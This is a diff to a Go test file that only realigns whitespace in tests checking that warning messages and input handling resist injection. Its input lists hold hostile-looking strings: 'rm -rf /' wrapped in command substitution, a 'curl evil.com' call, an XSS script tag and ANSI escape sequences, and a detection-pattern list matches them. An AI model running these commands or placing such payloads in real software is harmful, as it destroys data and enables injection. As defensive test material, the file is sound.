@@ -16,16 +16,16 @@ func TestWarningMessageSafety(t *testing.T) {
 	inputs := []string{
 		// Potential injection payloads
 		`rm -rf / ; echo "$(curl evil.com)"`,
-		"echo '\x1b[31mred\x1b[0m'",              // ANSI escape codes
-		`echo "<script>alert('xss')</script>"`,     // XSS payload
-		"echo '\x1b[2J\x1b[H'",                    // Clear screen sequence
-		`echo "$(rm -rf /)"`,                       // Command substitution
-		"echo '\x00hidden'",                        // Null bytes
+		"echo '\x1b[31mred\x1b[0m'",            // ANSI escape codes
+		`echo "<script>alert('xss')</script>"`, // XSS payload
+		"echo '\x1b[2J\x1b[H'",                 // Clear screen sequence
+		`echo "$(rm -rf /)"`,                   // Command substitution
+		"echo '\x00hidden'",                    // Null bytes
 	}
 
 	dangerousPatterns := []string{
 		"<script>",
-		"\x1b[",       // ANSI escape
+		"\x1b[", // ANSI escape
 		"curl evil",
 	}
 
@@ -61,7 +61,7 @@ func TestMemorySafety(t *testing.T) {
 	inputs := []string{
 		string(make([]byte, MaxInputSize)),   // Max size zeros
 		string(make([]byte, MaxInputSize+1)), // Over max
-		"\x00\x00\x00\x00",                  // Null bytes
+		"\x00\x00\x00\x00",                   // Null bytes
 		strings.Repeat("\x00", 10000),        // Many null bytes
 		strings.Repeat("\xff", 10000),        // Many 0xFF bytes
 		strings.Repeat("\n", 10000),          // Many newlines
